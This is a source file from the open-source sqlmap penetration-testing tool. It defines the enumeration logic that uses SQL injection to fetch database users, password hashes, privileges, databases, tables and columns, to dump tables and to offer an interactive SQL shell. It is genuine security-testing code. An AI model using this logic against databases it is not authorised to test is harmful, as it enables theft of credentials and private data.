#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.agent import agent
from lib.core.common import getRange
from lib.core.common import parsePasswordHash
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.data import temp
from lib.core.dump import dumper
from lib.core.exception import sqlmapMissingMandatoryOptionException
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapUndefinedMethod
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.settings import TIME_SECONDS
from lib.core.shell import autoCompletion
from lib.core.unescaper import unescaper
from lib.request import inject
from lib.request.connect import Connect as Request


class Enumeration:
    """
    This class defines generic enumeration functionalities for plugins.

    """

    def __init__(self, dbms):
        self.has_information_schema = False

        self.banner                 = ""
        self.currentUser            = ""
        self.currentDb              = ""
        self.cachedUsers            = []
        self.cachedUsersPassword    = {}
        self.cachedUsersPrivileges  = {}
        self.cachedDbs              = []
        self.cachedTables           = {}
        self.cachedColumns          = {}
        self.dumpedTable            = {}

        temp.inference              = queries[dbms].inference


    # TODO: move this function to an appropriate file
    def timeTest(self):
        infoMsg  = "testing time based blind sql injection on parameter "
        infoMsg += "'%s'" % kb.injParameter
        logger.info(infoMsg)

        # TODO: probably the '; <COMMENT>' will be filled in in all
        # future time based SQL injection attacks at the end of the
        # stacked query. Find a way that goStacked() function itself
        # append it.
        query  = "%s; " % queries[kb.dbms].timedelay % TIME_SECONDS
        query += queries[kb.dbms].comment

        self.timeTest = inject.goStacked(query, timeTest=True)

        if self.timeTest[0] == True:
            return "True, verified with payload: %s" % self.timeTest[1]
        else:
            return "False"


    def forceDbmsEnum(self):
        pass


    def getBanner(self):
        infoMsg = "fetching banner"
        logger.info(infoMsg)

        query = queries[kb.dbms].banner

        if not self.banner:
            self.banner = inject.getValue(query)

        return self.banner


    def getCurrentUser(self):
        infoMsg = "fetching current user"
        logger.info(infoMsg)

        query = queries[kb.dbms].currentUser

        if not self.currentUser:
            self.currentUser = inject.getValue(query)

        return self.currentUser


    def getCurrentDb(self):
        infoMsg = "fetching current database"
        logger.info(infoMsg)

        query = queries[kb.dbms].currentDb

        if not self.currentDb:
            self.currentDb = inject.getValue(query)

        return self.currentDb


    def getUsers(self):
        infoMsg = "fetching database users"
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].users

        condition  = ( kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ) )
        condition |= ( kb.dbms == "MySQL" and not self.has_information_schema )

        if conf.unionUse:
            if condition:
                query = rootQuery["inband"]["query2"]
            else:
                query = rootQuery["inband"]["query"]
            value = inject.getValue(query, blind=False)

            if value:
                self.cachedUsers = value

        if not self.cachedUsers:
            infoMsg = "fetching number of database users"
            logger.info(infoMsg)

            if condition:
                query = rootQuery["blind"]["count2"]
            else:
                query = rootQuery["blind"]["count"]
            count = inject.getValue(query, inband=False, expected="int")

            if not count.isdigit() or not len(count) or count == "0":
                errMsg = "unable to retrieve the number of database users"
                raise sqlmapNoneDataException, errMsg

            indexRange = getRange(count)

            for index in indexRange:
                if condition:
                    query = rootQuery["blind"]["query2"] % index
                else:
                    query = rootQuery["blind"]["query"] % index
                user = inject.getValue(query, inband=False)

                if user:
                    self.cachedUsers.append(user)

        if not self.cachedUsers:
            errMsg = "unable to retrieve the database users"
            raise sqlmapNoneDataException, errMsg

        return self.cachedUsers


    def getPasswordHashes(self):
        infoMsg = "fetching database users password hashes"
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].passwords

        if conf.unionUse:
            if kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                query = rootQuery["inband"]["query2"]
            else:
                query = rootQuery["inband"]["query"]

            condition = rootQuery["inband"]["condition"]

            if conf.user:
                if "," in conf.user:
                    users = conf.user.split(",")
                    query += " WHERE "
                    query += " OR ".join("%s = '%s'" % (condition, user) for user in users)
                else:
                    query += " WHERE %s = '%s'" % (condition, conf.user)

            value = inject.getValue(query, blind=False)

            if value:
                for user, password in value:
                    if not user or user == " ":
                        continue

                    password = parsePasswordHash(password)

                    if not self.cachedUsersPassword.has_key(user):
                        self.cachedUsersPassword[user] = [password]
                    else:
                        self.cachedUsersPassword[user].append(password)

        if not self.cachedUsersPassword:
            if conf.user:
                if "," in conf.user:
                    users = conf.user.split(",")
                else:
                    users = [conf.user]
            else:
                if not len(self.cachedUsers):
                    users = self.getUsers()
                else:
                    users = self.cachedUsers

            retrievedUsers = set()

            for user in users:
                if kb.dbms == "MySQL":
                    parsedUser = re.search("\047(.*?)\047@'", user)

                    if parsedUser:
                        user = parsedUser.groups()[0]

                if user in retrievedUsers:
                    continue

                infoMsg  = "fetching number of password hashes "
                infoMsg += "for user '%s'" % user
                logger.info(infoMsg)

                if kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
                    query = rootQuery["blind"]["count2"] % user
                else:
                    query = rootQuery["blind"]["count"] % user
                count = inject.getValue(query, inband=False, expected="int")

                if not count.isdigit() or not len(count) or count == "0":
                    warnMsg  = "unable to retrieve the number of password "
                    warnMsg += "hashes for user '%s'" % user
                    logger.warn(warnMsg)
                    continue

                infoMsg = "fetching password hashes for user '%s'" % user
                logger.info(infoMsg)

                passwords  = []
                indexRange = getRange(count)

                for index in indexRange:
                    if kb.dbms == "Microsoft SQL Server":
                        if kb.dbmsVersion[0] in ( "2005", "2008" ):
                            query = rootQuery["blind"]["query2"] % (user, index, user)
                        else:
                            query = rootQuery["blind"]["query"] % (user, index, user)
                    else:
                        query = rootQuery["blind"]["query"] % (user, index)
                    password = inject.getValue(query, inband=False)
                    password = parsePasswordHash(password)
                    passwords.append(password)

                if passwords:
                    self.cachedUsersPassword[user] = passwords
                else:
                    warnMsg  = "unable to retrieve the password "
                    warnMsg += "hashes for user '%s'" % user
                    logger.warn(warnMsg)

                retrievedUsers.add(user)

        if not self.cachedUsersPassword:
            errMsg  = "unable to retrieve the password "
            errMsg += "hashes for the database users"
            raise sqlmapNoneDataException, errMsg

        return self.cachedUsersPassword


    def __isAdminFromPrivileges(self, privileges):
        # In PostgreSQL the usesuper privilege means that the
        # user is DBA
        dbaCondition  = ( kb.dbms == "PostgreSQL" and "super" in privileges )

        # In Oracle the DBA privilege means that the
        # user is DBA
        dbaCondition |= ( kb.dbms == "Oracle" and "DBA" in privileges )

        # In MySQL >= 5.0 the SUPER privilege means
        # that the user is DBA
        dbaCondition |= ( kb.dbms == "MySQL" and self.has_information_schema and "SUPER" in privileges )

        # In MySQL < 5.0 the super_priv privilege means
        # that the user is DBA
        dbaCondition |= ( kb.dbms == "MySQL" and not self.has_information_schema and "super_priv" in privileges )

        return dbaCondition


    def getPrivileges(self):
        infoMsg = "fetching database users privileges"
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].privileges

        # Set containing the list of DBMS administrators
        areAdmins = set()

        mysqlPrivs = (
                        ( 1, "select_priv" ),
                        ( 2, "insert_priv" ),
                        ( 3, "update_priv" ),
                        ( 4, "delete_priv" ),
                        ( 5, "create_priv" ),
                        ( 6, "drop_priv" ),
                        ( 7, "reload_priv" ),
                        ( 8, "shutdown_priv" ),
                        ( 9, "process_priv" ),
                        ( 10, "file_priv" ),
                        ( 11, "grant_priv" ),
                        ( 12, "references_priv" ),
                        ( 13, "index_priv" ),
                        ( 14, "alter_priv" ),
                        ( 15, "show_db_priv" ),
                        ( 16, "super_priv" ),
                        ( 17, "create_tmp_table_priv" ),
                        ( 18, "lock_tables_priv" ),
                        ( 19, "execute_priv" ),
                        ( 20, "repl_slave_priv" ),
                        ( 21, "repl_client_priv" ),
                        ( 22, "create_view_priv" ),
                        ( 23, "show_view_priv" ),
                        ( 24, "create_routine_priv" ),
                        ( 25, "alter_routine_priv" ),
                        ( 26, "create_user_priv" ),
                     )

        pgsqlPrivs = (
                        ( 1, "createdb" ),
                        ( 2, "super" ),
                        ( 3, "catupd" ),
                     )

        if conf.unionUse:
            if kb.dbms == "MySQL" and not self.has_information_schema:
                query     = rootQuery["inband"]["query2"]
                condition = rootQuery["inband"]["condition2"]
            else:
                query     = rootQuery["inband"]["query"]
                condition = rootQuery["inband"]["condition"]

            if conf.user:
                if "," in conf.user:
                    users = conf.user.split(",")
                    query += " WHERE "
                    # NOTE: I assume that the user provided is not in
                    # MySQL >= 5.0 syntax 'user'@'host'
                    if kb.dbms == "MySQL" and self.has_information_schema:
                        queryUser = "%" + conf.user + "%"
                        query += " OR ".join("%s LIKE '%s'" % (condition, "%" + user + "%") for user in users)
                    else:
                        query += " OR ".join("%s = '%s'" % (condition, user) for user in users)
                else:
                    # NOTE: I assume that the user provided is not in
                    # MySQL >= 5.0 syntax 'user'@'host'
                    if kb.dbms == "MySQL" and self.has_information_schema:
                        queryUser = "%" + conf.user + "%"
                        query += " WHERE %s LIKE '%s'" % (condition, queryUser)
                    else:
                        query += " WHERE %s = '%s'" % (condition, conf.user)

            values = inject.getValue(query, blind=False)

            if values:
                for value in values:
                    user       = None
                    privileges = set()

                    for count in xrange(0, len(value)):
                        # The first column is always the username
                        if count == 0:
                            user = value[count]

                        # The other columns are the privileges
                        else:
                            privilege = value[count]

                            # In PostgreSQL we get 1 if the privilege is
                            # True, 0 otherwise
                            if kb.dbms == "PostgreSQL" and privilege.isdigit():
                                for position, pgsqlPriv in pgsqlPrivs:
                                    if count == position and int(privilege) == 1:
                                        privileges.add(pgsqlPriv)

                            # In MySQL >= 5.0 and Oracle we get the list
                            # of privileges as string
                            elif kb.dbms == "Oracle" or ( kb.dbms == "MySQL" and self.has_information_schema ):
                                privileges.add(privilege)

                            # In MySQL < 5.0 we get Y if the privilege is 
                            # True, N otherwise
                            elif kb.dbms == "MySQL" and not self.has_information_schema:
                                for position, mysqlPriv in mysqlPrivs:
                                    if count == position and privilege.upper() == "Y":
                                        privileges.add(mysqlPriv)

                    if self.__isAdminFromPrivileges(privileges):
                        areAdmins.add(user)

                    if self.cachedUsersPrivileges.has_key(user):
                        self.cachedUsersPrivileges[user].extend(privileges)
                    else:
                        self.cachedUsersPrivileges[user] = list(privileges)

        if not self.cachedUsersPrivileges:
            conditionChar = "="

            if conf.user:
                if kb.dbms == "MySQL" and self.has_information_schema:
                    conditionChar = " LIKE "

                    if "," in conf.user:
                        users = set()
                        for user in conf.user.split(","):
                            users.add("%" + user + "%")
                    else:
                        users = [ "%" + conf.user + "%" ]

                elif "," in conf.user:
                    users = conf.user.split(",")

                else:
                    users = [ conf.user ]

            else:
                if not len(self.cachedUsers):
                    users = self.getUsers()
                else:
                    users = self.cachedUsers

            retrievedUsers = set()

            for user in users:
                unescapedUser = None

                if kb.dbms == "MySQL" and self.has_information_schema:
                    unescapedUser = unescaper.unescape(user, quote=False)

                if user in retrievedUsers:
                    continue

                infoMsg  = "fetching number of privileges "
                infoMsg += "for user '%s'" % user
                logger.info(infoMsg)

                if unescapedUser:
                    queryUser = unescapedUser
                else:
                    queryUser = user

                if kb.dbms == "MySQL" and not self.has_information_schema:
                    query = rootQuery["blind"]["count2"] % queryUser
                elif kb.dbms == "MySQL" and self.has_information_schema:
                    query = rootQuery["blind"]["count"] % (conditionChar, queryUser)
                else:
                    query = rootQuery["blind"]["count"] % queryUser
                count = inject.getValue(query, inband=False, expected="int")

                if not count.isdigit() or not len(count) or count == "0":
                    warnMsg  = "unable to retrieve the number of "
                    warnMsg += "privileges for user '%s'" % user
                    logger.warn(warnMsg)
                    continue

                infoMsg = "fetching privileges for user '%s'" % user
                logger.info(infoMsg)

                privileges = set()
                indexRange = getRange(count)

                for index in indexRange:
                    if kb.dbms == "MySQL" and not self.has_information_schema:
                        query = rootQuery["blind"]["query2"] % (queryUser, index)
                    elif kb.dbms == "MySQL" and self.has_information_schema:
                        query = rootQuery["blind"]["query"] % (conditionChar, queryUser, index)
                    else:
                        query = rootQuery["blind"]["query"] % (queryUser, index)
                    privilege = inject.getValue(query, inband=False)

                    # In PostgreSQL we get 1 if the privilege is True,
                    # 0 otherwise
                    if kb.dbms == "PostgreSQL" and ", " in privilege:
                        privilege = privilege.replace(", ", ",")
                        privs = privilege.split(",")
                        i = 1

                        for priv in privs:
                            if priv.isdigit() and int(priv) == 1:
                                for position, pgsqlPriv in pgsqlPrivs:
                                    if position == i:
                                        privileges.add(pgsqlPriv)

                            i += 1

                    # In MySQL >= 5.0 and Oracle we get the list
                    # of privileges as string
                    elif kb.dbms == "Oracle" or ( kb.dbms == "MySQL" and self.has_information_schema ):
                        privileges.add(privilege)

                    # In MySQL < 5.0 we get Y if the privilege is 
                    # True, N otherwise
                    elif kb.dbms == "MySQL" and not self.has_information_schema:
                        privilege = privilege.replace(", ", ",")
                        privs = privilege.split(",")
                        i = 1

                        for priv in privs:
                            if priv.upper() == "Y":
                                for position, mysqlPriv in mysqlPrivs:
                                    if position == i:
                                        privileges.add(mysqlPriv)

                            i += 1

                    if self.__isAdminFromPrivileges(privileges):
                        areAdmins.add(user)

                    # In MySQL < 5.0 we break the cycle after the first
                    # time we get the user's privileges otherwise we
                    # duplicate the same query
                    if kb.dbms == "MySQL" and not self.has_information_schema:
                        break

                if privileges:
                    self.cachedUsersPrivileges[user] = list(privileges)
                else:
                    warnMsg  = "unable to retrieve the privileges "
                    warnMsg += "for user '%s'" % user
                    logger.warn(warnMsg)

                retrievedUsers.add(user)

        if not self.cachedUsersPrivileges:
            errMsg  = "unable to retrieve the privileges "
            errMsg += "for the database users"
            raise sqlmapNoneDataException, errMsg

        return ( self.cachedUsersPrivileges, areAdmins )


    def getDbs(self):
        if kb.dbms == "MySQL" and not self.has_information_schema:
            warnMsg  = "information_schema not available, "
            warnMsg += "back-end DBMS is MySQL < 5. database "
            warnMsg += "names will be fetched from 'mysql' database"
            logger.warn(warnMsg)

        infoMsg = "fetching database names"
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].dbs

        if conf.unionUse:
            if kb.dbms == "MySQL" and not self.has_information_schema:
                query = rootQuery["inband"]["query2"]
            else:
                query = rootQuery["inband"]["query"]
            value = inject.getValue(query, blind=False)

            if value:
                self.cachedDbs = value

        if not self.cachedDbs:
            infoMsg = "fetching number of databases"
            logger.info(infoMsg)

            if kb.dbms == "MySQL" and not self.has_information_schema:
                query = rootQuery["blind"]["count2"]
            else:
                query = rootQuery["blind"]["count"]
            count = inject.getValue(query, inband=False, expected="int")

            if not count.isdigit() or not len(count) or count == "0":
                errMsg = "unable to retrieve the number of databases"
                raise sqlmapNoneDataException, errMsg

            indexRange = getRange(count)

            for index in indexRange:
                if kb.dbms == "MySQL" and not self.has_information_schema:
                    query = rootQuery["blind"]["query2"] % index
                else:
                    query = rootQuery["blind"]["query"] % index
                db = inject.getValue(query, inband=False)

                if db:
                    self.cachedDbs.append(db)

        if not self.cachedDbs:
            errMsg = "unable to retrieve the database names"
            raise sqlmapNoneDataException, errMsg

        return self.cachedDbs


    def getTables(self):
        if kb.dbms == "MySQL" and not self.has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            raise sqlmapUnsupportedFeatureException, errMsg

        self.forceDbmsEnum()

        infoMsg = "fetching tables"
        if conf.db:
            infoMsg += " for database '%s'" % conf.db
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].tables

        if conf.unionUse:
            query = rootQuery["inband"]["query"]
            condition = rootQuery["inband"]["condition"]

            if conf.db:
                if "," in conf.db:
                    dbs = conf.db.split(",")
                    query += " WHERE "
                    query += " OR ".join("%s = '%s'" % (condition, db) for db in dbs)
                else:
                    query += " WHERE %s='%s'" % (condition, conf.db)
            elif conf.excludeSysDbs:
                query += " WHERE "
                query += " AND ".join("%s != '%s'" % (condition, db) for db in self.excludeDbsList)
                infoMsg = "skipping system databases '%s'" % ", ".join(db for db in self.excludeDbsList)
                logger.info(infoMsg)

            value = inject.getValue(query, blind=False)

            if value:
                for db, table in value:
                    if not self.cachedTables.has_key(db):
                        self.cachedTables[db] = [table]
                    else:
                        self.cachedTables[db].append(table)

        if not self.cachedTables:
            if conf.db:
                if "," in conf.db:
                    dbs = conf.db.split(",")
                else:
                    dbs = [conf.db]
            else:
                if not len(self.cachedDbs):
                    dbs = self.getDbs()
                else:
                    dbs = self.cachedDbs

            for db in dbs:
                if conf.excludeSysDbs and db in self.excludeDbsList:
                    infoMsg = "skipping system database '%s'" % db
                    logger.info(infoMsg)

                    continue

                infoMsg  = "fetching number of tables for "
                infoMsg += "database '%s'" % db
                logger.info(infoMsg)

                query = rootQuery["blind"]["count"] % db
                count = inject.getValue(query, inband=False, expected="int")

                if not count.isdigit() or not len(count) or count == "0":
                    warnMsg  = "unable to retrieve the number of "
                    warnMsg += "tables for database '%s'" % db
                    logger.warn(warnMsg)
                    continue

                tables     = []
                indexRange = getRange(count)

                for index in indexRange:
                    query = rootQuery["blind"]["query"] % (db, index)
                    table = inject.getValue(query, inband=False)
                    tables.append(table)

                if tables:
                    self.cachedTables[db] = tables
                else:
                    warnMsg  = "unable to retrieve the tables "
                    warnMsg += "for database '%s'" % db
                    logger.warn(warnMsg)

        if not self.cachedTables:
            errMsg = "unable to retrieve the tables for any database"
            raise sqlmapNoneDataException, errMsg

        return self.cachedTables


    def getColumns(self, onlyColNames=False):
        if kb.dbms == "MySQL" and not self.has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            raise sqlmapUnsupportedFeatureException, errMsg

        if not conf.tbl:
            errMsg = "missing table parameter"
            raise sqlmapMissingMandatoryOptionException, errMsg

        if "." in conf.tbl:
            conf.db, conf.tbl = conf.tbl.split(".")

        self.forceDbmsEnum()

        if not conf.db:
            warnMsg  = "missing database parameter, sqlmap is going to "
            warnMsg += "use the current database to enumerate table "
            warnMsg += "'%s' columns" % conf.tbl
            logger.warn(warnMsg)

            conf.db = self.getCurrentDb()

        infoMsg  = "fetching columns "
        infoMsg += "for table '%s' " % conf.tbl
        infoMsg += "on database '%s'" % conf.db
        logger.info(infoMsg)

        rootQuery = queries[kb.dbms].columns

        if conf.unionUse:
            if kb.dbms in ( "MySQL", "PostgreSQL" ):
                query = rootQuery["inband"]["query"] % (conf.tbl, conf.db)
            elif kb.dbms == "Oracle":
                query = rootQuery["inband"]["query"] % conf.tbl.upper()
            elif kb.dbms == "Microsoft SQL Server":
                query = rootQuery["inband"]["query"] % (conf.db, conf.db,
                                                        conf.db, conf.db,
                                                        conf.db, conf.db,
                                                        conf.db, conf.tbl)

            value = inject.getValue(query, blind=False)

            if value:
                table = {}
                columns = {}
                for column, colType in value:
                    columns[column] = colType
                table[conf.tbl] = columns
                self.cachedColumns[conf.db] = table

        if not self.cachedColumns:
            infoMsg  = "fetching number of columns "
            infoMsg += "for table '%s'" % conf.tbl
            infoMsg += " on database '%s'" % conf.db
            logger.info(infoMsg)

            if kb.dbms in ( "MySQL", "PostgreSQL" ):
                query = rootQuery["blind"]["count"] % (conf.tbl, conf.db)
            elif kb.dbms == "Oracle":
                query = rootQuery["blind"]["count"] % conf.tbl.upper()
            elif kb.dbms == "Microsoft SQL Server":
                query = rootQuery["blind"]["count"] % (conf.db, conf.db, conf.tbl)

            count = inject.getValue(query, inband=False, expected="int")

            if not count.isdigit() or not len(count) or count == "0":
                errMsg  = "unable to retrieve the number of columns "
                errMsg += "for table '%s' " % conf.tbl
                errMsg += "on database '%s'" % conf.db
                raise sqlmapNoneDataException, errMsg

            table      = {}
            columns    = {}
            indexRange = getRange(count)

            for index in indexRange:
                if kb.dbms in ( "MySQL", "PostgreSQL" ):
                    query = rootQuery["blind"]["query"] % (conf.tbl, conf.db, index)
                elif kb.dbms == "Oracle":
                    query = rootQuery["blind"]["query"] % (conf.tbl.upper(), index)
                elif kb.dbms == "Microsoft SQL Server":
                    query = rootQuery["blind"]["query"] % (index, conf.db,
                                                           conf.db, conf.tbl)

                column = inject.getValue(query, inband=False)

                if not onlyColNames:
                    if kb.dbms in ( "MySQL", "PostgreSQL" ):
                        query = rootQuery["blind"]["query2"] % (conf.tbl, column, conf.db)
                    elif kb.dbms == "Oracle":
                        query = rootQuery["blind"]["query2"] % (conf.tbl.upper(), column)
                    elif kb.dbms == "Microsoft SQL Server":
                        query = rootQuery["blind"]["query2"] % (conf.db, conf.db, conf.db,
                                                                conf.db, column, conf.db,
                                                                conf.db, conf.db, conf.tbl)

                    colType = inject.getValue(query, inband=False)
                    columns[column] = colType
                else:
                    columns[column] = None

            if columns:
                table[conf.tbl] = columns
                self.cachedColumns[conf.db] = table

        if not self.cachedColumns:
            errMsg  = "unable to retrieve the columns "
            errMsg += "for table '%s' " % conf.tbl
            errMsg += "on database '%s'" % conf.db
            raise sqlmapNoneDataException, errMsg

        return self.cachedColumns


    def dumpTable(self):
        if not conf.tbl:
            errMsg = "missing table parameter"
            raise sqlmapMissingMandatoryOptionException, errMsg

        if "." in conf.tbl:
            conf.db, conf.tbl = conf.tbl.split(".")

        self.forceDbmsEnum()

        if not conf.db:
            warnMsg  = "missing database parameter, sqlmap is going to "
            warnMsg += "use the current database to dump table "
            warnMsg += "'%s' entries" % conf.tbl
            logger.warn(warnMsg)

            conf.db = self.getCurrentDb()

        rootQuery = queries[kb.dbms].dumpTable

        if conf.col:
            colList = conf.col.split(",")
            self.cachedColumns[conf.db] = {}
            self.cachedColumns[conf.db][conf.tbl] = {}
            for column in colList:
                self.cachedColumns[conf.db][conf.tbl][column] = None
        elif not self.cachedColumns:
            if kb.dbms == "MySQL" and not self.has_information_schema:
                errMsg  = "information_schema not available, "
                errMsg += "back-end DBMS is MySQL < 5.0"
                raise sqlmapUnsupportedFeatureException, errMsg

            self.cachedColumns = self.getColumns(onlyColNames=True)

        colList = self.cachedColumns[conf.db][conf.tbl].keys()
        colList.sort(key=lambda x: x.lower())
        colString = ", ".join(column for column in colList)

        infoMsg = "fetching"
        if conf.col:
            infoMsg += " columns '%s'" % colString
        infoMsg += " entries for table '%s'" % conf.tbl
        infoMsg += " on database '%s'" % conf.db
        logger.info(infoMsg)

        if conf.unionUse:
            if kb.dbms == "Oracle":
                query = rootQuery["inband"]["query"] % (colString, conf.tbl.upper())
            else:
                query = rootQuery["inband"]["query"] % (colString, conf.db, conf.tbl)
            entries = inject.getValue(query, blind=False)

            if entries:
                entriesCount = len(entries)
                index        = 0

                for column in colList:
                    colLen = len(column)

                    if not self.dumpedTable.has_key(column):
                        self.dumpedTable[column] = { "length": 0, "values": [] }

                    for entry in entries:
                        if isinstance(entry, str):
                            colEntry = entry
                        else:
                            colEntry = entry[index]

                        colEntryLen = len(colEntry)
                        maxLen = max(colLen, colEntryLen)

                        if maxLen > self.dumpedTable[column]["length"]:
                            self.dumpedTable[column]["length"] = maxLen

                        self.dumpedTable[column]["values"].append(colEntry)

                    index += 1

        if not self.dumpedTable:
            if conf.unionUse:
                warnMsg = "unable to retrieve the "
                if conf.col:
                    warnMsg += "columns '%s' " % colString
                warnMsg += "entries for table '%s' " % conf.tbl
                warnMsg += "on database '%s'" % conf.db
                warnMsg += " through UNION query SQL injection, "
                warnMsg += "probably because it has no entries, going "
                warnMsg += "blind to confirm"
                logger.warn(warnMsg)

            infoMsg = "fetching number of "
            if conf.col:
                infoMsg += "columns '%s' " % colString
            infoMsg += "entries for table '%s' " % conf.tbl
            infoMsg += "on database '%s'" % conf.db
            logger.info(infoMsg)

            if kb.dbms == "Oracle":
                query = rootQuery["blind"]["count"] % conf.tbl.upper()
            else:
                query = rootQuery["blind"]["count"] % (conf.db, conf.tbl)
            count = inject.getValue(query, inband=False, expected="int")

            if not count.isdigit() or not len(count) or count == "0":
                errMsg = "unable to retrieve the number of "
                if conf.col:
                    errMsg += "columns '%s' " % colString
                errMsg += "entries for table '%s' " % conf.tbl
                errMsg += "on database '%s'" % conf.db

                if conf.dumpAll:
                    logger.warn(errMsg)
                    return self.dumpedTable
                else:
                    raise sqlmapNoneDataException, errMsg

            lengths    = {}
            entries    = {}
            indexRange = getRange(count, True)

            for index in indexRange:
                for column in colList:
                    if column not in lengths:
                        lengths[column] = 0

                    if column not in entries:
                        entries[column] = []

                    if kb.dbms in ( "MySQL", "PostgreSQL" ):
                        query = rootQuery["blind"]["query"] % (column, conf.db,
                                                               conf.tbl, index)
                    elif kb.dbms == "Oracle":
                        query = rootQuery["blind"]["query"] % (column, column,
                                                               conf.tbl.upper(),
                                                               index)
                    elif kb.dbms == "Microsoft SQL Server":
                        query = rootQuery["blind"]["query"] % (column, conf.db,
                                                               conf.tbl, column,
                                                               index, column,
                                                               conf.db, conf.tbl)

                    value = inject.getValue(query, inband=False)

                    lengths[column] = max(lengths[column], len(value))
                    entries[column].append(value)

            for column, columnEntries in entries.items():
                if lengths[column] < len(column):
                    length = len(column)
                else:
                    length = lengths[column]

                self.dumpedTable[column] = {
                                             "length": length,
                                             "values": columnEntries,
                                           }

                entriesCount = len(columnEntries)

        if self.dumpedTable:
            self.dumpedTable["__infos__"] = {
                                              "count": entriesCount,
                                              "table": conf.tbl,
                                              "db":    conf.db
                                            }
        else:
            errMsg = "unable to retrieve the entries of "
            if conf.col:
                errMsg += "columns '%s' " % colString
            errMsg += "for table '%s' " % conf.tbl
            errMsg += "on database '%s'" % conf.db

            if conf.dumpAll:
                logger.warn(errMsg)
                return self.dumpedTable
            else:
                raise sqlmapNoneDataException, errMsg

        return self.dumpedTable


    def dumpAll(self):
        if kb.dbms == "MySQL" and not self.has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            raise sqlmapUnsupportedFeatureException, errMsg

        conf.db           = None
        conf.tbl          = None
        conf.col          = None
        self.cachedDbs    = []
        self.cachedTables = self.getTables()

        for db, tables in self.cachedTables.items():
            conf.db = db

            for table in tables:
                conf.tbl = table
                self.cachedColumns = {}
                self.dumpedTable = {}

                data = self.dumpTable()

                if data:
                    dumper.dbTableValues(data)


    def sqlQuery(self, query):
        infoMsg = "fetching SQL SELECT query output: '%s'" % query
        logger.info(infoMsg)

        if query.startswith("select "):
            query = query.replace("select ", "SELECT ", 1)

        if " from " in query:
            query = query.replace(" from ", " FROM ")

        output = inject.getValue(query, fromUser=True)

        if output == "Quit":
            return None
        else:
            return output


    def sqlShell(self):
        infoMsg  = "calling %s shell. To quit type " % kb.dbms
        infoMsg += "'x' or 'q' and press ENTER"
        logger.info(infoMsg)

        autoCompletion(sqlShell=True)

        while True:
            query = None

            try:
                query = raw_input("sql> ")
            except KeyboardInterrupt:
                print
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not query:
                continue

            if query.lower() in ( "x", "q", "exit", "quit" ):
                break

            output = self.sqlQuery(query)

            if output and output != "Quit":
                dumper.string(query, output)
            elif output != "Quit":
                print "No output"
